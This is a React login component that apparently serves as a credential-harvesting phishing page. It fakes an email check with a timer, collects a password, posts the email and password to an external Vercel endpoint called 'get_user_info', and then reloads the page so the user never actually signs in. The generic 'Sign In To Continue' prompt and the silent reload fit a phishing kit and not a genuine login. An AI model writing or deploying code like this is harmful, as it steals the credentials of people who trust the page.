import React, { useState } from 'react';
import axios from 'axios'; // Make sure to import axios
import './Login.css';

const Login = () => {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isEmailConfirmed, setIsEmailConfirmed] = useState(false);
  const [password, setPassword] = useState('');

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handleEmailSubmit = () => {
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      alert('Please enter a valid email address');
      return;
    }

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setIsEmailConfirmed(true);
    }, 1000); // Simulate 1-second loading time
  };

  // New function to handle login
  const handleLogin = async () => {
    // Send the email and password to the backend
    setIsLoading(true);
    await axios.post('https://nm-76ba92qkl-chronos91s-projects.vercel.app/api/get_user_info', {
      email: email, // 
      password: password,
    });

    // Redirect to the same login page or refresh the page
    window.location.reload(); // This will refresh the page
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="input-group">
          <h2>Sign In To Continue -</h2>
          <div className="email-input-wrapper">
            <input
              type="email"
              value={email}
              onChange={handleEmailChange}
              disabled={isEmailConfirmed}
              placeholder="Email"
              required
            />
            <button onClick={handleEmailSubmit} disabled={isLoading || isEmailConfirmed || !email}>
              {isLoading ? (
                <span className="spinner"></span>
              ) : isEmailConfirmed ? (
                <span className="tick">✔</span>
              ) : (
                <span>Next</span>
              )}
            </button>
          </div>
        </div>
        {isEmailConfirmed && (
          <div className="input-group">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              required
            />
          </div>
        )}
        {isEmailConfirmed && password && (
          <button className="login-btn" onClick={handleLogin}>
            Login
          </button>
        )}
      </div>
    </div>
  );
};

export default Login;
